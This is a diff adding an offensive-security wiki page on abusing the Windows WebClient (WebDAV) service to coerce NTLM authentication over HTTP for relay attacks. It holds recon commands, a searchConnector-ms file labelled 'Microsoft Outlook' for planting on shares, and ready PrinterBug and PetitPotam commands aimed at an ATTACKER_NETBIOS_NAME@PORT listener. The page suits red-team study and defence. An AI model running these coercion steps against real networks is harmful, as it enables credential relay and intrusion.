@@ -1,0 +1,79 @@
+# WebClient abuse (WebDAV)
+
+## Theory
+
+> Web Distributed Authoring and Versioning (WebDAV) is an extension to Hypertext Transfer Protocol (HTTP) that defines how basic file functions such as copy, move, delete, and create are performed by using HTTP. ([docs.microsoft.com](https://docs.microsoft.com/en-us/windows/win32/webdav/webdav-portal))
+
+The WebClient service needs to be enabled for WebDAV-based programs and features to work. As it turns out, the WebClient service can be indirectly abused by attackers to coerce authentications. This technique needs to be combined with other coercion techniques (e.g. [PetitPotam](ms-efsr.md), [PrinterBug](ms-rprn.md)) to act as a booster for these techniques. **It allows attackers to elicit authentications made over HTTP instead of SMB**, hence heightening [NTLM relay](../ntlm/relay.md) capabilities.
+
+## Practice
+
+### Recon
+
+Attackers can remotely enumerate systems on which the WebClient is running, which is not uncommon in organisations that use OneDrive or SharePoint or when mounting drives with a WebDAV connection string.
+
+{% tabs %}
+{% tab title="UNIX-like" %}
+From UNIX-like systems, this can be achieved with [webclientservicescanner](https://github.com/Hackndo/WebclientServiceScanner) (Python)
+
+```bash
+webclientservicescanner 'domain.local'/'user':'password'@'machine'
+```
+{% endtab %}
+
+{% tab title="Windows" %}
+From Windows systems, this can be achived with [GetWebDAVStatus](https://github.com/G0ldenGunSec/GetWebDAVStatus) (C, C#)
+
+```bash
+GetWebDAVStatus.exe 'machine'
+```
+{% endtab %}
+{% endtabs %}
+
+{% hint style="info" %}
+Making a remote system start the WebClient service can be done with a [searchConnector-ms](https://docs.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) file uploaded to widely used share within the organisation. Each time a user browses the folder, the WebClient service will start transparently.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+    <description>Microsoft Outlook</description>
+    <isSearchOnlyItem>false</isSearchOnlyItem>
+    <includeInStartMenuScope>true</includeInStartMenuScope>
+    <templateInfo>
+        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+    </templateInfo>
+    <simpleLocation>
+        <url>https://whatever/</url>
+    </simpleLocation>
+</searchConnectorDescription>
+```
+{% endhint %}
+
+### Abuse
+
+&#x20;Regular coercion techniques rely on the attacker forcing a remote system to authenticate to another one. The "other" system is usually an IP address, a domain or NetBIOS name. With WebClient abuse, the other system needs to be supplied in a WebDAV Connection String format.
+
+The WebDAV Connection String format is: `\\SERVER@PORT\PATH\TO\DIR`.
+
+{% hint style="info" %}
+To retrieve an authenticated connection, the remote server that attacker wants to victim to be relayed to should be considered in the intranet zone. One way to do it is to use the NetBIOS name of the attacker machine instead of its IP address.
+{% endhint %}
+
+Below are a few examples of WebClient abuse with [PrinterBug](../print-spooler-service/printerbug.md) and [PetitPotam](ms-efsr.md).
+
+```bash
+# PrinterBug
+dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
+SpoolSample.exe "ATTACKER_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
+
+# PetitPotam
+Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
+Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
+PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
+```
+
+## Resources
+
+{% embed url="https://pentestlab.blog/2021/10/20/lateral-movement-webclient" %}
+
+{% embed url="https://www.webdavsystem.com/server/access/windows" %}
